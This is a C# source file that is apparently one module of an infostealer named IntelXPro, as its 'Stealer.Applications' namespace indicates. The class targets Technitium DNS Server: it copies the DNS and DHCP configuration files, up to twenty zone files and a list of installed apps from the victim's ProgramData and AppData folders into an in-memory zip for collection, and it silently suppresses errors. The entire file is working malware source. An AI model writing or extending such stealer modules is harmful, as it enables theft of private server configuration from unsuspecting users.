using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class TechnitiumDnsServer : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string programDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Technitium", "DNS Server");
            string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Technitium", "DNS Server");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "TechnitiumDnsServer";

            bool foundData = false;

            if (Directory.Exists(programDataPath))
            {
                foundData |= CollectFromDirectory(programDataPath, "ProgramData", zip, counterApplications);
            }

            if (Directory.Exists(appDataPath))
            {
                foundData |= CollectFromDirectory(appDataPath, "AppData", zip, counterApplications);
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromDirectory(string basePath, string location, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string configPath = Path.Combine(basePath, "config");
                if (Directory.Exists(configPath))
                {
                    string[] configFiles = new string[]
                    {
                        "dns.config",
                        "dhcp.config"
                    };

                    foreach (string configFile in configFiles)
                    {
                        string fullPath = Path.Combine(configPath, configFile);
                        if (File.Exists(fullPath))
                        {
                            string zipPath = $"Applications\\TechnitiumDnsServer\\{location}\\config\\{configFile}";
                            zip.AddFile(zipPath, File.ReadAllBytes(fullPath));
                            counterApplications.Files.Add(fullPath + " => " + zipPath);
                            foundData = true;
                        }
                    }
                }

                string zonesPath = Path.Combine(basePath, "zones");
                if (Directory.Exists(zonesPath))
                {
                    string[] zoneFiles = Directory.GetFiles(zonesPath, "*.zone", SearchOption.TopDirectoryOnly);
                    
                    foreach (string file in zoneFiles.Take(20))
                    {
                        string fileName = Path.GetFileName(file);
                        string zipPath = $"Applications\\TechnitiumDnsServer\\{location}\\zones\\{fileName}";
                        zip.AddFile(zipPath, File.ReadAllBytes(file));
                        counterApplications.Files.Add(file + " => " + zipPath);
                        foundData = true;
                    }
                }

                string appsPath = Path.Combine(basePath, "apps");
                if (Directory.Exists(appsPath))
                {
                    string[] appDirs = Directory.GetDirectories(appsPath);
                    
                    if (appDirs.Length > 0)
                    {
                        StringBuilder appsList = new StringBuilder();
                        appsList.AppendLine("Installed Apps:");
                        appsList.AppendLine();
                        
                        foreach (string appDir in appDirs)
                        {
                            string appName = Path.GetFileName(appDir);
                            appsList.AppendLine("- " + appName);
                        }
                        
                        string zipPath = $"Applications\\TechnitiumDnsServer\\{location}\\apps_list.txt";
                        zip.AddTextFile(zipPath, appsList.ToString());
                        counterApplications.Files.Add(zipPath);
                        foundData = true;
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
